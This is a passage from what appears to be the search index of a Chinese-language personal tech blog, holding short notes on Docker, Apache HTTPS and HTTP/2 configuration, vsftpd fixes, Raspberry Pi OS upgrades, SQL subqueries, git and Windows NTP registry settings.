","date":"2018-01-15","objectID":"/blog/posts/logdown/2018-01-15-4769676/:2:0","tags":["JavaScript"],"title":"[JS]為什麼能用document.form1.username呢?","uri":"/blog/posts/logdown/2018-01-15-4769676/"},{"categories":["JavaScript"],"content":"因為這都是JavaScript裡基礎的東西 看到都快要去跪鍵盤了orz 參考來源： JavaScript Properties HTMLCollection - Web APIs | MDN [筆記]用javascript來取得表單元素內容的值(javascript取值) ~ PJCHENder那些沒告訴你的小細節 ","date":"2018-01-15","objectID":"/blog/posts/logdown/2018-01-15-4769676/:2:1","tags":["JavaScript"],"title":"[JS]為什麼能用document.form1.username呢?","uri":"/blog/posts/logdown/2018-01-15-4769676/"},{"categories":["Docker"],"content":"要做blog移轉，筆記先存檔… docker 容器挂载目录权限问题 docker data volume vs mounted host directory - Stack Overflow ","date":"2018-01-14","objectID":"/blog/posts/logdown/2018-01-14-docker-permission-issues/:0:0","tags":["Docker"],"title":"Docker權限問題","uri":"/blog/posts/logdown/2018-01-14-docker-permission-issues/"},{"categories":["Docker"],"content":"要做blog移轉，筆記先存檔… 在 docker 中執行需要環境變數的 cron job « 少年沒帶腦 Python寫的Crontab替代品，支持Docker - 每日頭條 Scheduling tasks with cron on Docker – Jon Ribeiro 艦長，你有事嗎？: 在 Synology NAS 上用 docker 運行 php-cli ","date":"2018-01-14","objectID":"/blog/posts/logdown/2018-01-14-docker-schedule/:0:0","tags":["Docker","排程"],"title":"Docker排程","uri":"/blog/posts/logdown/2018-01-14-docker-schedule/"},{"categories":["Docker"],"content":"要做blog移轉，筆記先存檔… Docker容器时间同步问题 - DockOne.io ","date":"2018-01-14","objectID":"/blog/posts/logdown/2018-01-14-docker-time-synchronization-correction/:0:0","tags":["Docker"],"title":"Docker時間同步(校正)","uri":"/blog/posts/logdown/2018-01-14-docker-time-synchronization-correction/"},{"categories":["Docker"],"content":"上一篇，記錄使用Docker架設Minecraft-server 突中還發現Volume要怎麼使用，以前沒有用對方法 在些記錄一下 docker查詢掛載資訊 一般使用volumes docker run -d -P -v /usr/local/apache2/htdocs httpd docker inspect -f '{{.Mounts}}' container_id 查詢volumes目錄路徑 之前我以為覆製檔案只能用docker cp 現在不用煩腦怎麼覆製 但我還有一個遺問 怎麼知道container workdir路徑是什麼 Docker image WorkDir 目錄 常常不知道，image 預設啟動目錄在哪裡，又要跑去翻文件 有時候想直接看到…，這時候下這個指令 docker image inspect httpd 可以看到WorkingDir路徑 Docker 掛載常見寫法差別 docker run -P -d -v /usr/local/apache2/htdocs httpd 和 docker run -P -d -v /usr/local/apache2/htdocs:/usr/local/apache2/htdocs httpd 這個一樣 今天發現原來是不一樣的東西， 原本爬文找有沒有第一次volumes時候把image東西copy出來 docker run -P -d -v /usr/local/apache2/htdocs httpd 這個指令就是做這個動作 只不過volume存在docker inspect musing_hopper | grep volume 可以看到存在位置，所以/usr/local/apache2/htdocs是指container path Docker volumes 路徑 docker volumes 存在位置在/var/lib/docker/volumes需要有root權限才能進去 docker rm 並不會刪除volumes檔 想一次刪掉container跟volume嗎? 只要下這個指令docker rm -v container_id 就能玩成目地了 Docker 快速刪除 又看到更外速刪除container,volume方法 docker container prune or docker rm $(docker ps -aq) 這個刪除volume也會把link清掉 docker rm -lv CONTAINER 更多內容在docker容器删除了，link怎么还在？ - SegmentFault裡面 先記錄到這邊，感覺link也需要好好筆記 我竟然不知道要清除link這個東西，以為他會自動消失(汗) 題外話： Docker volume 簡單用法 | 只放拖鞋的鞋櫃 10 Docker Tips and Tricks That Will Make You Sing A Whale Song of Joy | I care, I share, I’m Nathan LeClaire. Remove dangling docker images Maxkit: Dockerfile 初步閱讀與學習紀錄 深入理解docker的link机制-博客-云栖社区-阿里云 清理Docker的container，image与volume · 零壹軒·笔记 docker容器删除了，link怎么还在？ - SegmentFault ","date":"2018-01-14","objectID":"/blog/posts/logdown/2018-01-14-docker-volume-notes/:0:0","tags":["Docker","volume"],"title":"docker volume筆記","uri":"/blog/posts/logdown/2018-01-14-docker-volume-notes/"},{"categories":["Docker"],"content":"最近想架一個Minecraft-Server 但我想找一個比較方便的方法裝 後來找到itzg/minecraft-server - Docker Hub 簡單使用 docker run -d -v /path/on/host:/data \\ -e EULA=TRUE \\ -p 25565:25565 -e EULA=TRUE --name mc itzg/minecraft-server Docker Hub分數還滿高的image server.properties的設定可以用-e xxx=xxx參數使用 然後發現dockerfiles/minecraft-server at master · itzg/dockerfiles作者有寫好docker-compose.yml檔 可直接使用docker-compose up -d 可以在docker-compose.yml檔設定一些environment variable 和沒有要使用的rcon移除 要關閉就使用docker-compose down 但這個不會移除container跟volume docker-copmpose down -f 移除container 或著 docker-compose down -v移除container和volume ","date":"2018-01-14","objectID":"/blog/posts/logdown/2018-01-14-simple-use-of-docker-erection-minecraft-server/:0:0","tags":["Docker"],"title":"簡單使用docker架設Minecraft-server","uri":"/blog/posts/logdown/2018-01-14-simple-use-of-docker-erection-minecraft-server/"},{"categories":["Linux"],"content":"想說flexget應該正常 結果執行flexget -v 找不到/bin/xxx/python2.6 升級OS後python是2.7 想說直接升級flexget sudo pip install --upgrade setuptools sudo pip install --upgrade flexget FlexGet官方升級說明 但是不成功… sudo pip install --upgrade --force-reinstall flexget python - Can I force pip to reinstall the current version? - Stack Overflow 還是安裝失敗 囧 sudo pip3 install --upgrade --force-reinstall flexget pip3就可以了… 不知道為什麼 .flexget/db-config.sqlit要刪掉 執行flexget --test execute怎麼跑出錯誤Transmissionrpc module version 0.11 or higher required sudo pip3 install transmissionrpc flexget --test execute跑出 2018-01-07 22:07 VERBOSE manager Creating new database /home/pi/.flexget/test-config.sqlite - DO NOT INTERUPT ... 2018-01-07 22:08 CRITICAL manager [/templates/autoPass] The key `disable_builtins` is not valid here. Only known plugin names are valid keys. 2018-01-07 22:08 CRITICAL manager [/templates/olddownload] The key `disable_builtins` is not valid here. Only known plugin names are valid keys. 2018-01-07 22:08 CRITICAL manager [/templates/default] The key `disable_builtins` is not valid here. Only known plugin names are valid keys. 2018-01-07 22:08 CRITICAL manager 是config.yml裡設定disable_buildin關係 disable_builtins: [seen_info_hash] 先暫時移除 改寫法可能是下面這段 https://flexget.com/Plugins/disable 先分享我的config.yml templates: default: transmission: host: localhost port: 9091 username: username password: usernamepassword addpaused: no path: /mnt/extHDD/Download/Mikata/201710/{{task}} free_space: path: /mnt/extHDD/ space: 1000 clean_transmission: host: localhost port: 9091 username: username password: usernamepassword finished_for: 4 days min_ratio: 1 if: - \"'季度全集' in category\": reject olddownload: transmission: host: localhost port: 9091 username: username password: usernamepassword addpaused: no path: /mnt/extHDD/Download/Mikata/201707/{{task}} free_space: path: /mnt/extHDD/ space: 1000 clean_transmission: host: localhost port: 9091 username: username password: usernamepassword finished_for: 4 days min_ratio: 1 if: - \"'季度全集' in category\": reject autoPass: transmission: host: localhost port: 9091 username: username password: usernamepassword addpaused: yes path: /mnt/extHDD/Download/Mikata/201707/{{task}} if: - \"'季度全集' in category\": reject tasks: Fate/Apocrypha: rss: url: https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=Apocrypha+team_id%3A37+720+繁 other_fields: [category] accept_all: yes template: default 參考來源： python - Can I force pip to reinstall the current version? - Stack Overflow FlexGet FlexGet [SOLVED] Flexget can’t see Transmissionrpc is installed - help - Forum - FlexGet ","date":"2018-01-07","objectID":"/blog/posts/logdown/2018-01-07-4726929/:0:0","tags":["Linux","flexget"],"title":"更新系統flexget壞掉啦!!","uri":"/blog/posts/logdown/2018-01-07-4726929/"},{"categories":["Linux"],"content":"自重Raspberry Pi 升級後 sudo vim 編輯不能右鍵貼上了 Copy/paste into SSH’d VIM from local (Windows) clipboard - Unix \u0026 Linux Stack Exchange 藍色文字看不太到 (技巧分享)更改PieTTY字體顏色.讓眼睛更舒服？ - 102-14雲端班 - 老爹隨筆私塾 - 老爹隨筆 ","date":"2018-01-07","objectID":"/blog/posts/logdown/2018-01-07-pietty-vim-cant-put-up-a-problem/:0:0","tags":["vim","pietty"],"title":"[Pietty]Vim不能貼上問題\u0026換字體顏色","uri":"/blog/posts/logdown/2018-01-07-pietty-vim-cant-put-up-a-problem/"},{"categories":["Apache"],"content":"由於更新系統 apache也更著升到2.4 查一些資料，有些升級設定檔不太一樣 所以我沒有選擇保留設定檔 #設定htaccess 首先，我發現我的htaccess沒有生效 太久設定的東西，大概忘了一半XD \u003cDirectory \"/var/www\"\u003e AllowOverride All \u003c/Directory\u003e 這個設定完還不夠安全 http://xxxxx.com/.htaccess可以看到裡面資訊 我還發現我有設定 \u003cFiles ~ \"^\\.ht\"\u003e Order allow,deny Deny from all Satisfy all EnableSendfile Off \u003c/Files\u003e \u003cFiles ~ \".part$\"\u003e order allow,deny deny from all \u003c/Files\u003e 更換成 \u003cFiles ~ \"^\\.ht\"\u003e Require all denied Satisfy all EnableSendfile Off \u003c/Files\u003e \u003cFiles ~ \".part$\"\u003e Require all denied \u003c/Files\u003e 想說我之前有寫過autoindex筆記 後來發現裡面沒有記很多東西 今天來補一補吧 \u003cFiles ~ \".part$\"\u003e order allow,deny deny from all Satisfy All \u003c/Files\u003e Order deny,allow Deny from all AuthName \"Please type password\" AuthType Basic AuthUserFile \"----你看不到----/.htpasswd\" require valid-user IndexHeadInsert \"\u003cmeta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"\u003e\u003clink rel=\\\"shortcut icon\\\" type=\\\"image/png\\\" href=\\\"/include/favicon.ico\\\"/\u003e\" IndexStyleSheet \"/include/autoindex.css\" Allow from 192.168.1.0/24 Satisfy Any Usage: htpasswd [-cmdpsD] passwordfile username htpasswd -b[cmdpsD] passwordfile username password htpasswd -n[mdps] username htpasswd -nb[mdps] username password -c 创建一个新的加密密码文件 -n 不更新文件，显示结果 -m 使用MD5加密密码 -d 使用CRYPT加密密码（默认） -p 不加密密码 -s 使用SHA加密密码 -b 直接在命令行输入密码，而不是提示后再输入密码 -D 删除用户 在Windows, NetWare与 TPF系统，'-m' 是默认的密码加密方式。 在所有其他系统，'-p'可能不能使用。 設定帳號密碼 htpasswd -c .htpasswd username 使用apache htpasswd生成加密的密码文件，并使用.htaccess控制目录访问 - 傲雪星枫 - CSDN博客 我真的忘記^.ht是不是我設定的 裡面來有一些設定說明 之前在 VirtualBox 的 Shared Folder 進行開發，在寫 PHP 的時候都沒問題， 但是只要碰到靜態檔案，例如 Js 檔，明明修改了，看到的還是舊的版本。 這時候只要重開 Apache 就好了，但是每次這樣重開也不是辦法，於是 Google 一下是哪裡出了問題。 發現是 Apache 的 sendfile 在做怪，這是一個利用 Kernel 的 sendfile 來加速靜態檔案發送的功能。 VirtualBox Apache Sendfile - 蟑螂窩 最早接觸Satisfy，是這樣一個情況，一個目錄啟用了密碼保護，想單獨開放它的一個子目錄，讓這個子目錄無須密碼即可訪問 Apache的Satisfy详解 – Fwolf’s Blog ","date":"2018-01-07","objectID":"/blog/posts/logdown/2018-01-07-4726228/:0:0","tags":["Linux","apache"],"title":"更新系統apache壞掉，從零開始設定","uri":"/blog/posts/logdown/2018-01-07-4726228/"},{"categories":["Apache"],"content":"更多參考： 鳥哥的 Linux 私房菜 – WWW 伺服器 Apache 存取限制 #設定https 由於之前用certbot設定過了 只要加設定就可以了 ###舊設定 ServerAdmin service@\u003c\u003c不讓你看\u003e\u003e DocumentRoot /var/www/ ServerName \u003c\u003c不讓你看\u003e\u003e ServerAlias \u003c\u003c不讓你看\u003e\u003e SSLEngine On SSLCertificateFile /etc/letsencrypt/live/\u003c\u003c不讓你看\u003e\u003e/cert.pem SSLCertificateKeyFile /etc/letsencrypt/live/\u003c\u003c不讓你看\u003e\u003e/privkey.pem SSLCertificateChainFile /etc/letsencrypt/live/\u003c\u003c不讓你看\u003e\u003e/chain.pem SSLCACertificateFile /etc/letsencrypt/live/\u003c\u003c不讓你看\u003e\u003e/fullchain.pem 發現好像可以不用設定上面一些Name 直接照上面網址設定 ","date":"2018-01-07","objectID":"/blog/posts/logdown/2018-01-07-4726228/:1:0","tags":["Linux","apache"],"title":"更新系統apache壞掉，從零開始設定","uri":"/blog/posts/logdown/2018-01-07-4726228/"},{"categories":["Apache"],"content":"新設定 SSLEngine On SSLCertificateFile /etc/letsencrypt/live/\u003c\u003c不讓你看\u003e\u003e/cert.pem SSLCertificateKeyFile /etc/letsencrypt/live/\u003c\u003c不讓你看\u003e\u003e/privkey.pem SSLCertificateChainFile /etc/letsencrypt/live/\u003c\u003c不讓你看\u003e\u003e/chain.pem SSLCACertificateFile /etc/letsencrypt/live/\u003c\u003c不讓你看\u003e\u003e/fullchain.pem #設定http2 然後參照[網站] 網域搬新家、升級 HTTPS 與 HTTP/2（長篇大論版） – Digiologist設定https 發生悲劇 怎麼會沒有http2 mod 後來發現要apache2.4.7才有，apache 2.4.1沒有 系統繼續升級到stretch，就能更新到2.4.7 照上面執行就能順利完成 簡單記錄設定 $ sudo a2enmod http2 $ sudo service apache2 restart 在/etc/apache2/sites-enabled/000-default.conf 裡VirtualHost加入： Protocols h2 http/1.1 在/etc/apache2/sites-enabled/default-ssl.conf 裡VirtualHost加入： Protocols h2 h2c http/1.1 重啟apache就能正常，可以瀏覽器開放著工具是不是http2 $ sudo service apache2 reload 剩下就是http導https頁面 今天剛好看到用.htaccess自動導向https – I’m a Taiwan based UIUX designer. RewriteEngine On // 開啟rewrite這個功能模組 RewriteCond %{SERVER_PORT} 80 // RewriteCond：rewrite condition 重寫條件， // %則是變數的意思，也就是{SERVER_PORT} 80是重寫的條件(變數)。 // 整句意思是：所有由port 80的連線為…(接續下行) RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301] // RewriteRule：重寫規則為…， // ^(.*)$：任意字元， // %{HTTP_HOST}%{REQUEST_URI}：訪問的主域名與相對位址， // [L,R=301]：L為last，最後一條規則， // R=301則是http協議中的狀態碼，意為永久改變位置。 // 整句意思是：永久重寫所有連線為https的網址 htaccess 常用命令 - 小小工程師的日常筆記 - 因為我還有特殊需 還需要設定autoindex照日期排序 \u003cIfModule mod_autoindex.c\u003e ... IndexOrderDefault Descending Date ... \u003c/IfModule\u003e 這次經驗覺得設定檔還是要寫一下注解 不然放置很久，都不知道是不是自己加的XD 解決問題 SSL/TLS (2) | Leo Yeh’s Blog 使用a2ensite和a2dissite来快速切换站点 - CSDN博客 風和日麗 天氣晴: Apache 的 .htaccess 失效？ htaccess 常用命令 - 小小工程師的日常筆記 - ","date":"2018-01-07","objectID":"/blog/posts/logdown/2018-01-07-4726228/:1:1","tags":["Linux","apache"],"title":"更新系統apache壞掉，從零開始設定","uri":"/blog/posts/logdown/2018-01-07-4726228/"},{"categories":["vsftpd"],"content":"上篇更新系統完 我遇到vsftpd沒辦法啟動 簡單記錄採雷筆記 由於怕新版設定檔不太一樣 所以我就沒有保留舊的設定檔(當然我有先抓下來預備) 其怪怎麼無法啟動vsftpd pi@raspberrypi $ sudo dpkg --configure vsftpd 設定 vsftpd (3.0.2-17+deb8u1) ... vsftpd user (ftp) already exists, doing nothing. vsftpd directory (/srv/ftp) already exists, doing nothing. insserv: warning: script 'K02noip2' missing LSB tags and overrides insserv: warning: script 'noip2' missing LSB tags and overrides [warn] Starting FTP server: vsftpd[....] vsftpd failed - probably invalid config. ... (warning). invoke-rc.d: initscript vsftpd, action \"start\" failed. dpkg: error processing package vsftpd (--configure): 子程序 已安裝的 post-installation script 傳回了錯誤退出狀態 1 處理時發生錯誤： vsftpd 後來發現，/etc/init.d/vsftpd裡面腳本執行有問題 我試著執行sudo vsftpd pi@raspberrypi /etc/apache2/sites-enabled $ sudo vsftpd 500 OOPS: socket Google一下，發現沒有幾個人遇到這個問題 後來把/etc/vsftpd 設定改 listen=YES 之後又遇到 pi@raspberrypi $ sudo vsftpd 500 OOPS: run two copies of vsftpd for IPv4 and IPv6 把/etc/vsftpd #listen_ipv6=YES或改成listen_ipv6=NO 就能正常運行 ","date":"2018-01-07","objectID":"/blog/posts/logdown/2018-01-07-4726190/:0:0","tags":["vsftpd"],"title":"更新系統vsftpd壞掉事情","uri":"/blog/posts/logdown/2018-01-07-4726190/"},{"categories":["Linux"],"content":"最近好想把Apache升級到2.4，這樣我就能使用http2 不過因為樹莓派一直卡在Wheezy 原本想說原升怎麼沒到2.4 後來發現Jessie才能升… 想說怎麼都沒有更新 現在版本是Stretch 好想升Apache 2.4阿 最先有試著用葉難: Raspberry Pi：如何更新Raspbian rpi-upgrade更新上去，但是沒有更新最高 Raspbian 從 7 Wheezy 升級到 8 Jessie - 亂碼中的煉金術 修改檔案 /etc/apt/sources.list 把第一行所有的 “wheezy” 置換為 “jessie” ，修改後大概是這樣 “deb http://mirrordirector.raspbian.org/raspbian/ jessie main contrib non-free rpi” 修改檔案 /etc/apt/sources.list.d/raspi.list 把第一行所有的 “wheezy” 置換為 “jessie”，第一行最後加上 “ ui” ，修改後大概是這樣 “deb http://archive.raspberrypi.org/debian jessie main ui” 建立資料夾 /home/pi/.config/autostart ， “mkdir /home/pi/.config/autostart” (注意 config 前面有 “.” ) 更新軟體套件庫 “sudo apt-get update” 升級系統及軟體 “sudo apt-get -y dist-upgrade” (這過程大概兩小時， “-y” 是不詢問直接安裝) 改socues.list可以試試sudo sed -i 's/wheezy/jessie/g' /etc/apt/sources.list 改完執行下面，就更新完成 sudo apt-get update sudo apt-get -y dist-upgrade 更新前最好備份SD會比較好 我有apache2跟vsftpd有壞掉 下面幾篇會補一下我遇到的問題 更新期間還會問要不要保留設定檔 通常我都會選D ，看有異動什麼檔案 假如沒有問題，就直接更換 中間我原本想wheezy直接升到Stretch 所以直接把wheezy改成stretch 但好像升級有問題，可能不執直接跳兩階XD 網路上有些人說用rpi-upgrade，有些說不要用rpi-rpgrade 但後面都有用apt-get update \u0026 apt-get - y dist-upgrade ","date":"2018-01-06","objectID":"/blog/posts/logdown/2018-01-06-raspberry-pi-encountered-problems-starting-from-0-unable-to-log-in-ssh/:0:0","tags":["Raspberry Pi"],"title":"Raspberry pi 從0開始遇到問題(無法登入ssh)  \u0026 更新Jessie升級","uri":"/blog/posts/logdown/2018-01-06-raspberry-pi-encountered-problems-starting-from-0-unable-to-log-in-ssh/"},{"categories":["Linux"],"content":"最新燒入新版img預設沒有開啟ssh 開啟SSH功能 2016-11-25: SSH disabled by default; can be enabled by creating a file with name “ssh” in boot partition 意思應該是說創建一個名叫\"ssh\"的文件在boot分區,應該就是內存卡的根目錄。 在/boot目錄 touch ssh 開機才會啟動ssh 重新燒img想說怎麼連不到XD 原來新版有改 #swap 更新完吃2G /etc/dphys-swapfile設定CONF_SWAPSIZE=100 存檔之後service dphys-swapfile start就正常了 https://blog.gtwang.org/iot/raspberry-pi/raspberry-pi-swap-configuration-using-usb-stick/ ","date":"2018-01-06","objectID":"/blog/posts/logdown/2018-01-06-raspberry-pi-encountered-problems-starting-from-0-unable-to-log-in-ssh/:1:0","tags":["Raspberry Pi"],"title":"Raspberry pi 從0開始遇到問題(無法登入ssh)  \u0026 更新Jessie升級","uri":"/blog/posts/logdown/2018-01-06-raspberry-pi-encountered-problems-starting-from-0-unable-to-log-in-ssh/"},{"categories":["Linux"],"content":"參考來源 raspbian 系统配置中遇到的坑 NOOBS_v2_4_0_MozartC_新浪博客 Raspberry Pi 的基礎 - 沒螢幕、沒鍵盤、沒網路，居然也能設定 Wi-FI 連線 | IT 技術家 Enable HTTP2 in Apache on Ubuntu 16.04 | DigitalOcean [網站] 網域搬新家、升級 HTTPS 與 HTTP/2（長篇大論版） – Digiologist Raspberry Pi 的基礎 - 沒螢幕、沒鍵盤、沒網路，居然也能設定 Wi-FI 連線 | IT 技術家 树莓派系统升级Raspbian Wheezy到Raspbian Jessie(树莓派2B+） – 默默的点滴 ","date":"2018-01-06","objectID":"/blog/posts/logdown/2018-01-06-raspberry-pi-encountered-problems-starting-from-0-unable-to-log-in-ssh/:2:0","tags":["Raspberry Pi"],"title":"Raspberry pi 從0開始遇到問題(無法登入ssh)  \u0026 更新Jessie升級","uri":"/blog/posts/logdown/2018-01-06-raspberry-pi-encountered-problems-starting-from-0-unable-to-log-in-ssh/"},{"categories":["Linux"],"content":"長期有一台筆電都是用Ezgo，最近看到有人寫 [2018 鐵人賽] 簡潔高效的 PHP \u0026 Laravel 工作術：從 elementary OS 下手的聰明改造提案 #1 就試著裝裝看XD，沒想到比我裝的Ezgo非常順 操作介面有點像mac 就簡單做一下記錄 輸入法這個照做就可以完成 [2018 鐵人賽] 簡潔高效的 PHP \u0026 Laravel 工作術：從 elementary OS 下手的聰明改造提案 #10 其中我還遇到很奇怪的事 目前懷疑是appcenter壞掉 導至我系統壞掉…重開機也不能登入(就是 登入一定去就馬上登出，登入畫面也沒圖片) 目前有applications - App Center stuck on ‘waiting’ - elementary OS Stack Exchange 在tty1下這個dpkg --configure -a指令就可以正常進去了 原本在樹莓派使用TightVNC 在elementary OS進然一進去沒有畫面 在粉絲團詢問到好用的遠端 有人推AnyDesk 真的很好用，還有cli指令 Command Line Interface – Customer Feedback for AnyDesk 開機登入自動啟動anydesk --start-service [2018 鐵人賽] 簡潔高效的 PHP \u0026 Laravel 工作術：從 elementary OS 下手的聰明改造提案 #1 applications - App Center stuck on ‘waiting’ - elementary OS Stack Exchange elementary OS 0.4 Loki安装后的配置 - 简书 ","date":"2018-01-04","objectID":"/blog/posts/logdown/2018-01-04-4718279/:0:0","tags":null,"title":"elementary OS 裝機小體驗","uri":"/blog/posts/logdown/2018-01-04-4718279/"},{"categories":null,"content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. ","date":"2018-01-01","objectID":"/blog/posts/hello-world/:0:0","tags":null,"title":"Hello World","uri":"/blog/posts/hello-world/"},{"categories":null,"content":"Quick Start ","date":"2018-01-01","objectID":"/blog/posts/hello-world/:1:0","tags":null,"title":"Hello World","uri":"/blog/posts/hello-world/"},{"categories":null,"content":"Create a new post $ hexo new \"My New Post\" More info: Writing ","date":"2018-01-01","objectID":"/blog/posts/hello-world/:1:1","tags":null,"title":"Hello World","uri":"/blog/posts/hello-world/"},{"categories":null,"content":"Run server $ hexo server More info: Server ","date":"2018-01-01","objectID":"/blog/posts/hello-world/:1:2","tags":null,"title":"Hello World","uri":"/blog/posts/hello-world/"},{"categories":null,"content":"Generate static files $ hexo generate More info: Generating ","date":"2018-01-01","objectID":"/blog/posts/hello-world/:1:3","tags":null,"title":"Hello World","uri":"/blog/posts/hello-world/"},{"categories":null,"content":"Deploy to remote sites $ hexo deploy More info: Deployment ","date":"2018-01-01","objectID":"/blog/posts/hello-world/:1:4","tags":null,"title":"Hello World","uri":"/blog/posts/hello-world/"},{"categories":["SQL"],"content":"之前用子查詢第二層，竟然抓不到外層的欄位 已經找到 終於知道為什麼子查詢沒辦法抓取外面的表 | 程式狂想筆記 有時候跟本不知道為什麼?後來問公司的前軰，他說第二層就抓不到最外一層 但這種強制記這種觀念感覺不是很好，今天 Google 查一下原因 在這邊整理一下 XD 今天多層次子查詢的 sql 執行順序的問題-wj_zizi-ITPUB 博客和你真的会玩 SQL 吗？无处不在的子查询 - 文章 - 伯乐在线 看到子查詢有分兩類 相關子查詢 非相關子查詢 這兩個其實不難分，不要被兩個專有名詞嚇到 先講非相關子查詢，簡單講就是子查詢跟外面 SQL 查詢內容沒有相關 非相關子查詢只會跑一次，所以效能上會非常快 執行順序也比外層先，所以這也是為什麼非相關子查詢沒法取得外層欄位的原因 範例如下，以下子查詢只會查一次 SELECT * FROM xxxx WHERE class = (SELECT max(cost) FROM bbbb ) 相關子查詢就反知，比較吃效能，每一行都會執行 loop 先不談slides/SQL_reporting.pdf at master · TritonHo/slides裡面有介紹有些 DB 會自動做 join 動作 這個我們比較常用到 SELECT＊ FROM xxxx a WHERE cost \u003e (SELECT avg(cost) FROM bbbb where class = a.class ) SELECT * FROM a1 WHERE EXISTS (SELECT 'X' FROM (SELECT w2.corp_id FROM a1 w2 WHERE w2.period_id \u003c= a1.period_id) u WHERE u.corp_id = a1.corp_id); 第二层子查询居然不认最外层表中的列 - Oracle 开发 - ITPUB 论坛－中国最专业的 IT 技术社区看到有不能跑的 example 目前猜測 form 是非相關子查詢，我猜因為 from 會先執行，所以抓不到外層 sql 语法相关子查询与非相关子查询-流浪的野狼-ITPUB 博客看到一個標量子查詢(相對於多值子查詢)名稱 select OrderId From Orders where EmployeeId IN (select EmployeeId From employees where lastName like 'Da%') 將’Davolio’改為’D%‘時,這個時候子查詢中返回結果為 2 行,等號右邊此時為多值,查詢失敗.將’=‘改為 in 謂詞.查詢才能通過. employees 表中無 lastname=‘jason’,外部查詢將返回 null. ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-sql-subquery-notes/:0:0","tags":["sql","相關子查詢","非相關子查詢"],"title":"SQL子查詢筆記(相關子查詢/非相關子查詢)","uri":"/blog/posts/logdown/2017-12-23-sql-subquery-notes/"},{"categories":["SQL"],"content":"結論 SQL 有太多東西要學了 XD 這些離清楚之後比較不容易採到雷 要學的東西太多了 orz ###20171226 無聊寫的 SQL SELECT a.id, a.rev, a.content FROM `docs` a WHERE a.id IN ( SELECT max(id) FROM `docs` b WHERE b.id IN (SELECT id FROM `docs` c WHERE c.id=a.id) ) ; http://sqlfiddle.com/#!9/a6c585/30596 原本以為只會有一筆 是 From a table 先執行 而 a 有四筆 子查詢關連 a.id 所以結果是 4 筆沒錯 做 max 也會沒有意義 參考來源 你真的会玩 SQL 吗？无处不在的子查询 - 文章 - 伯乐在线 对象-关系数据库管理系统原理与实现 - 李战怀, 李红燕, 徐秋元 - Google 圖書 你真的会玩 SQL 吗？无处不在的子查询 - 文章 - 伯乐在线 多層次子查詢的 sql 執行順序的問題-wj_zizi-ITPUB 博客 第二层子查询居然不认最外层表中的列 - Oracle 开发 - ITPUB 论坛－中国最专业的 IT 技术社区 [SQL ] 兩層以上子查詢辨認 Table 別名 - 看板 Database - 批踢踢實業坊 相關子查詢和嵌套子查詢 - 問問題 MySql 學習(三) —— 子查詢(where、from、exists) 及 連線查詢(left join、right join、inner join、union join) - 掃文資訊 MySql 学习(三) —— 子查询(where、from、exists) 及 连接查询(left join、right join、inner join、union join) - bojiangzhou - 博客园 sql 语法相关子查询与非相关子查询-流浪的野狼-ITPUB 博客 ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-sql-subquery-notes/:1:0","tags":["sql","相關子查詢","非相關子查詢"],"title":"SQL子查詢筆記(相關子查詢/非相關子查詢)","uri":"/blog/posts/logdown/2017-12-23-sql-subquery-notes/"},{"categories":["SQL"],"content":"今天要查詢商品價格有小數點的，爬一下Google 有查到不錯方法，記錄一下 select col1, case col1 when cast(col1 as int) then '不是' else '是' end from 表1 select col1 from 表1 where col1 \u003c\u003e cast(col1 as int) 參考來源 邏輯生活: SQL 判斷值是否有小數點 ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-sql-judge-fast-no-decimal-point/:0:0","tags":["sql"],"title":"SQL判斷快否有小數點","uri":"/blog/posts/logdown/2017-12-23-sql-judge-fast-no-decimal-point/"},{"categories":["Git"],"content":"今天看到git網路上寫的，發現它可以建立新空分支。 因為不常使用，在此筆記XD git checkout --orphan gh-pages //建立一個沒有parent的branch，並移到該branch上 建立自己的GitHub Project Pages | kpman | code 在GIT中创建一个空分支 - Min的专栏 - SegmentFault ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-git-establishes-an-empty-branch/:0:0","tags":["git","branch"],"title":"git建立空分支","uri":"/blog/posts/logdown/2017-12-23-git-establishes-an-empty-branch/"},{"categories":["Linux"],"content":"最近做生理監測設定，組長發現廠商時間上傳時間跟HIS不太合理 就是測量時間會大於上傳時間 這怎麼那麼奇怪!!!但用想也知道是設備跟Server不同步 這時候NTP就派上用場了 終於用在實務上 Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\Servers] @=\"0\" \"0\"=\"**IP**\" [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\W32Time\\TimeProviders\\NtpClient] \"DllName\"=hex(2):25,00,73,00,79,00,73,00,74,00,65,00,6d,00,72,00,6f,00,6f,00,\\ 74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,77,\\ 00,33,00,32,00,74,00,69,00,6d,00,65,00,2e,00,64,00,6c,00,6c,00,00,00 \"Enabled\"=dword:00000001 \"InputProvider\"=dword:00000001 \"AllowNonstandardModeCombinations\"=dword:00000001 \"CrossSiteSyncFlags\"=dword:00000002 \"ResolvePeerBackoffMinutes\"=dword:0000000f \"ResolvePeerBackoffMaxTimes\"=dword:00000007 \"CompatibilityFlags\"=dword:80000000 \"EventLogFlags\"=dword:00000001 \"LargeSampleSkew\"=dword:00000003 \"SpecialPollInterval\"=dword:00000014 \"SpecialPollTimeRemaining\"=hex(7):74,00,69,00,6d,00,65,00,2e,00,77,00,69,00,6e,\\ 00,64,00,6f,00,77,00,73,00,2e,00,63,00,6f,00,6d,00,2c,00,37,00,64,00,37,00,\\ 37,00,61,00,65,00,31,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\\ 00,00,00,00,00,00,00 Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\Servers] @=\"0\" \"0\"=\"**IP**\" [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\W32Time\\TimeProviders\\NtpClient] \"DllName\"=hex(2):25,00,73,00,79,00,73,00,74,00,65,00,6d,00,72,00,6f,00,6f,00,\\ 